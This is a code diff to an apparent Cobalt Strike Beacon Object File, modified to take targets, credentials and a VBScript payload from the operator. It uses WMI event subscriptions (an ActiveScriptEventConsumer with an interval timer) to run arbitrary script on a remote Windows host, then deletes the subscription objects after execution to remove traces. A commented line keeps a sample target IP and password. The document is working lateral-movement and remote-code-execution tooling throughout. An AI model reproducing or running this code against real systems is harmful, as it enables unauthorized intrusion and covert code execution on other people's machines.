@@ -1,5 +1,6 @@
 //Adopted From: https://wumb0.in/scheduling-callbacks-with-wmi-in-cpp.html
 //Good reader: https://flylib.com/books/en/2.568.1/handling_wmi_events.html
+//Modified by Phil Keeble (@The_Keeb) to tie in aggressor and make it dynamic  
 
 #include <objbase.h>
 #include <windows.h>
@@ -14,19 +15,19 @@ extern "C" {
 
     void go(char* buff, int len);
 
-    DECLSPEC_IMPORT 	HRESULT  WINAPI			OLE32$CLSIDFromString(wchar_t* lpsz, LPCLSID pclsid);
-    DECLSPEC_IMPORT	 HRESULT  WINAPI	 	OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
-    DECLSPEC_IMPORT 	HRESULT  WINAPI		 	OLE32$CoInitializeEx(LPVOID, DWORD);
-    DECLSPEC_IMPORT 	VOID     WINAPI		 	OLE32$CoUninitialize();
-    DECLSPEC_IMPORT 	HRESULT  WINAPI		 	OLE32$IIDFromString(wchar_t* lpsz, LPIID lpiid);
-    DECLSPEC_IMPORT 	HRESULT  WINAPI	 	 	OLE32$CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
-    DECLSPEC_IMPORT 	WINOLEAUTAPI		  	OLEAUT32$VariantInit(VARIANTARG* pvarg);
+    DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$CLSIDFromString(wchar_t* lpsz, LPCLSID pclsid);
+    DECLSPEC_IMPORT	HRESULT  WINAPI	 	OLE32$CoCreateInstance(REFCLSID rclsid, LPUNKNOWN pUnkOuter, DWORD dwClsContext, REFIID riid, LPVOID* ppv);
+    DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$CoInitializeEx(LPVOID, DWORD);
+    DECLSPEC_IMPORT 	VOID     WINAPI		OLE32$CoUninitialize();
+    DECLSPEC_IMPORT 	HRESULT  WINAPI		OLE32$IIDFromString(wchar_t* lpsz, LPIID lpiid);
+    DECLSPEC_IMPORT 	HRESULT  WINAPI	 	OLE32$CoSetProxyBlanket(IUnknown* pProxy, DWORD dwAuthnSvc, DWORD dwAuthzSvc, OLECHAR* pServerPrincName, DWORD dwAuthnLevel, DWORD dwImpLevel, RPC_AUTH_IDENTITY_HANDLE pAuthInfo, DWORD dwCapabilities);
+    DECLSPEC_IMPORT 	VOID     WINAPI		OLEAUT32$VariantInit(VARIANTARG* pvarg);
     DECLSPEC_IMPORT 	WINBASEAPI void* WINAPI KERNEL32$HeapAlloc(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
     DECLSPEC_IMPORT 	WINBASEAPI HANDLE WINAPI KERNEL32$GetProcessHeap();
     DECLSPEC_IMPORT 	WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t* _Str);
-    DECLSPEC_IMPORT WINOLEAPI Ole32$CoInitializeSecurity(PSECURITY_DESCRIPTOR pSecDesc, LONG cAuthSvc, SOLE_AUTHENTICATION_SERVICE* asAuthSvc, void* pReserved1, DWORD dwAuthnLevel, DWORD dwImpLevel, void* pAuthList, DWORD dwCapabilities, void* pReserved3);
+    DECLSPEC_IMPORT     HRESULT  WINAPI         OLE32$CoInitializeSecurity(PSECURITY_DESCRIPTOR pSecDesc, LONG cAuthSvc, SOLE_AUTHENTICATION_SERVICE* asAuthSvc, void* pReserved1, DWORD dwAuthnLevel, DWORD dwImpLevel, void* pAuthList, DWORD dwCapabilities, void* pReserved3);
     DECLSPEC_IMPORT 	BSTR 		 	OLEAUT32$SysAllocString(const OLECHAR*);
-    WINBASEAPI VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
+    WINBASEAPI          VOID WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
 }
 
 BOOL putStringInClass(IWbemClassObject* obj, BSTR key, BSTR val, tag_CIMTYPE_ENUMERATION type) {
@@ -42,18 +43,23 @@ BOOL putStringInClass(IWbemClassObject* obj, BSTR key, BSTR val, tag_CIMTYPE_ENU
 }
 
 
-void CreateCreds(COAUTHINFO** authInfo, COAUTHIDENTITY** authidentity) {
+void CreateCreds(COAUTHINFO** authInfo, COAUTHIDENTITY** authidentity, wchar_t* user, wchar_t* password, wchar_t* domain, int IsCurrent) {
 
     COAUTHIDENTITY* id = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
     {
         id = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
-        id->User = (USHORT*)L"?USERNAME";
-        id->Password = (USHORT*)L"?PASSWORD";
-        id->Domain = (USHORT*)L"?DOMAIN";
+        id->User = (USHORT*)user;
+        id->Password = (USHORT*)password;
+        id->Domain = (USHORT*)domain;
         id->UserLength = MSVCRT$wcslen((const wchar_t*)id->User);
         id->PasswordLength = MSVCRT$wcslen((const wchar_t*)id->Password);
         id->DomainLength = MSVCRT$wcslen((const wchar_t*)id->Domain);
         id->Flags = SEC_WINNT_AUTH_IDENTITY_UNICODE;
+    }
+
+    if (IsCurrent == 0)
+    {
+    id = NULL;
     }
 
     COAUTHINFO* inf = (COAUTHINFO*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));
@@ -77,7 +83,7 @@ void  go (char* buff, int len) {
     IWbemServices* psvc = NULL;
 	
 	//Payload
-    BSTR vbScript = OLEAUT32$SysAllocString(L"Set objFileToWrite = CreateObject(\"Scripting.FileSystemObject\").OpenTextFile(\"C:\\out3.txt\", 2, true) : objFileToWrite.WriteLine(\"testing\") : objFileToWrite.Close : Set objFileToWrite = Nothing");
+    //BSTR vbScript = OLEAUT32$SysAllocString(bwvbscript);
 
     IWbemClassObject* ef = NULL, * ec = NULL, * e2c = NULL, * ti = NULL;
     IWbemClassObject* eventConsumer = NULL, * eventFilter = NULL, * f2cBinding = NULL, * timerinstruction = NULL;
@@ -125,28 +131,64 @@ void  go (char* buff, int len) {
     //init com interface
     HRESULT h = OLE32$CoInitializeEx(0, COINIT_APARTMENTTHREADED);
     if (FAILED(h)) {
-        return;
+        BeaconPrintf(CALLBACK_ERROR, "CoInitializeEx failed: 0x%08x", h);
+	return;
     }
     COAUTHIDENTITY* authidentity = (COAUTHIDENTITY*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHIDENTITY));
     COAUTHINFO* authInfo = (COAUTHINFO*)KERNEL32$HeapAlloc(KERNEL32$GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(COAUTHINFO));
-    CreateCreds(&authInfo, &authidentity);
+    
+    //BEACON operations
+    datap parser;
+    wchar_t* bwusername;
+    wchar_t* bwpassword;
+    wchar_t* bwdomain;
+    wchar_t* bwvbscript;
+    wchar_t* bwtarget2;
+    int IsCurrent;
+	
+    //BeaconDataParse(&parser, buf, len);
+    BeaconDataParse(&parser, buff, len);
+    {
+	bwtarget2 =	(wchar_t*)BeaconDataExtract(&parser, NULL);
+	bwdomain =	(wchar_t*)BeaconDataExtract(&parser, NULL);
+        bwusername =	(wchar_t*)BeaconDataExtract(&parser, NULL);
+        bwpassword =	(wchar_t*)BeaconDataExtract(&parser, NULL);
+        bwvbscript =	(wchar_t*)BeaconDataExtract(&parser, NULL);
+        IsCurrent = BeaconDataInt(&parser);
+    }
+	
+    CreateCreds(&authInfo, &authidentity, bwusername, bwpassword, bwdomain, IsCurrent);
+
+    if (IsCurrent == 0)
+    {
+    authidentity = NULL;
+    }
+
+    //CreateCreds(&authInfo, &authidentity);
+
+    //Set Payload
+    BSTR vbScript = OLEAUT32$SysAllocString(bwvbscript);
 	
     //create COM instance for WBEM
     h = OLE32$CoCreateInstance(Cwbm, 0, CLSCTX_INPROC_SERVER, Iwbm, (LPVOID*)&ploc);
     if (FAILED(h)) {
-        goto rip;
+        BeaconPrintf(CALLBACK_ERROR, "CoCreateInstance failed: 0x%08x", h);
+	goto rip;
     }
 	
     //connect to the \\root\subscription namespace
-    h = ploc->ConnectServer(OLEAUT32$SysAllocString(L"\\\\10.1.1.1\\ROOT\\SUBSCRIPTION"), OLEAUT32$SysAllocString(L"?USERNAME"), OLEAUT32$SysAllocString(L"PASSWORD"), 0, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, &psvc);
+    //h = ploc->ConnectServer(OLEAUT32$SysAllocString(L"\\\\192.168.151.132\\ROOT\\SUBSCRIPTION"), OLEAUT32$SysAllocString(L"dcom"), OLEAUT32$SysAllocString(L"Password123!"), 0, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, &psvc);
+    h = ploc->ConnectServer(OLEAUT32$SysAllocString(bwtarget2), NULL, NULL, 0, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, &psvc);
     if (FAILED(h)) {
-        goto rip;
+        BeaconPrintf(CALLBACK_ERROR, "ConnectServer failed: 0x%08x", h);
+	goto rip;
     }
 	
     //set COM proxy blanket
     h = OLE32$CoSetProxyBlanket(psvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
     if (FAILED(h)) {
-        goto rip;
+        BeaconPrintf(CALLBACK_ERROR, "CoSetProxyBlanket failed: 0x%08x", h);
+	goto rip;
     }
 	
     /* Delete the script
@@ -195,20 +237,26 @@ void  go (char* buff, int len) {
     {
         h = psvc->GetObject(OLEAUT32$SysAllocString(L"ActiveScriptEventConsumer"), 0, NULL, &eventConsumer, NULL);
         if (FAILED(h)) {
-            goto rip;
+        	BeaconPrintf(CALLBACK_ERROR, "GetObject1 failed: 0x%08x", h);
+		goto rip;
         }
 
         h = psvc->GetObject(OLEAUT32$SysAllocString(L"__EventFilter"), 0, NULL, &eventFilter, NULL);
         if (FAILED(h)) {
-            goto rip;
+        	BeaconPrintf(CALLBACK_ERROR, "GetObject2 failed: 0x%08x", h);
+		goto rip;
         }
+
         h = psvc->GetObject(OLEAUT32$SysAllocString(L"__FilterToConsumerBinding"), 0, NULL, &f2cBinding, NULL);
         if (FAILED(h)) {
-            goto rip;
+        	BeaconPrintf(CALLBACK_ERROR, "GetObject3 failed: 0x%08x", h);
+		goto rip;
         }
+
         h = psvc->GetObject(OLEAUT32$SysAllocString(L"__IntervalTimerInstruction"), 0, NULL, &timerinstruction, NULL);
         if (FAILED(h)) {
-            goto rip;
+        	BeaconPrintf(CALLBACK_ERROR, "GetObject4 failed: 0x%08x", h);
+		goto rip;
         }
     }
 
@@ -220,6 +268,8 @@ void  go (char* buff, int len) {
         //spawn __EventFilter class instance
         h = eventFilter->SpawnInstance(0, &ef);
         if (FAILED(h)) {
+        	BeaconPrintf(CALLBACK_ERROR, "SpawnInstance failed: 0x%08x", h);
+		goto rip;
         }
         else {
             putStringInClass(ef, OLEAUT32$SysAllocString(L"Query"), QueryString, CIM_STRING);
@@ -227,12 +277,16 @@ void  go (char* buff, int len) {
             putStringInClass(ef, OLEAUT32$SysAllocString(L"Name"), EventFilterNameString, CIM_STRING);
             h = psvc->PutInstance(ef, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
             if (FAILED(h)) {
+        	BeaconPrintf(CALLBACK_ERROR, "PutInstance failed: 0x%08x", h);
+		goto rip;
             }
         }
 
         //spawn ActiveScriptEventConsumer class instance
         h = eventConsumer->SpawnInstance(0, &ec);
         if (FAILED(h)) {
+        	BeaconPrintf(CALLBACK_ERROR, "SpawnInstance2 failed: 0x%08x", h);
+		goto rip;
         }
 
         else {
@@ -242,11 +296,15 @@ void  go (char* buff, int len) {
             putStringInClass(ec, OLEAUT32$SysAllocString(L"KillTimeout"), OLEAUT32$SysAllocString(L"0"), CIM_STRING);
             h = psvc->PutInstance(ec, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
             if (FAILED(h)) {
+        	BeaconPrintf(CALLBACK_ERROR, "PutInstance2 failed: 0x%08x", h);
+		goto rip;
             }
         }
         //spawn __FilterToConsumerBinding class instance
         h = f2cBinding->SpawnInstance(0, &e2c);
         if (FAILED(h)) {
+        	BeaconPrintf(CALLBACK_ERROR, "SpawnInstance3 failed: 0x%08x", h);
+		goto rip;
         }
         else {
 
@@ -254,6 +312,8 @@ void  go (char* buff, int len) {
             putStringInClass(e2c, OLEAUT32$SysAllocString(L"Filter"), EventFilterFullNameString, CIM_REFERENCE);
             h = psvc->PutInstance(e2c, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
             if (FAILED(h)) {
+        	BeaconPrintf(CALLBACK_ERROR, "PutInstance3 failed: 0x%08x", h);
+		goto rip;
             }
         }
 
@@ -262,6 +322,8 @@ void  go (char* buff, int len) {
     //spawn __IntervalTimerInstruction class instance
     h = timerinstruction->SpawnInstance(0, &ti);
     if (FAILED(h)) {
+        BeaconPrintf(CALLBACK_ERROR, "SpawnInstance4 failed: 0x%08x", h);
+	goto rip;
     }
     else {
         putStringInClass(ti, OLEAUT32$SysAllocString(L"TimerId"), TimerIntervalNameString, CIM_STRING);
@@ -269,13 +331,17 @@ void  go (char* buff, int len) {
 
         h = psvc->PutInstance(ti, WBEM_FLAG_CREATE_OR_UPDATE, NULL, NULL);
         if (FAILED(h)) {
+            BeaconPrintf(CALLBACK_ERROR, "PutInstance4 failed: 0x%08x", h);
+	    goto rip;
         }
     }
 
 
+    BeaconPrintf(CALLBACK_OUTPUT, "BOF Complete, now sleeping to allow execution");
     //Make sure that the event triggers before we delete it
     KERNEL32$Sleep(11000);
 
+    BeaconPrintf(CALLBACK_OUTPUT, "Sleep complete");
     //Delete the script, we don't care that much if it fails because the event is not found
     h = psvc->DeleteInstance(ActiveScriptConsumerFullNameString, 0, NULL, NULL);
     h = psvc->DeleteInstance(EventFilterFullNameString, 0, NULL, NULL);
@@ -292,6 +358,8 @@ void  go (char* buff, int len) {
     if (ec)
         ec->Release();
     ti = ec = ef = e2c = NULL;
+
+    BeaconPrintf(CALLBACK_OUTPUT, "Clean Up Completed");
 rip:
     if (eventConsumer)
         eventConsumer->Release();
@@ -305,4 +373,6 @@ rip:
         psvc->Release();
     if (ploc)
         ploc->Release();
+    BeaconPrintf(CALLBACK_OUTPUT, "rip function called and completed");
+    return;
 }
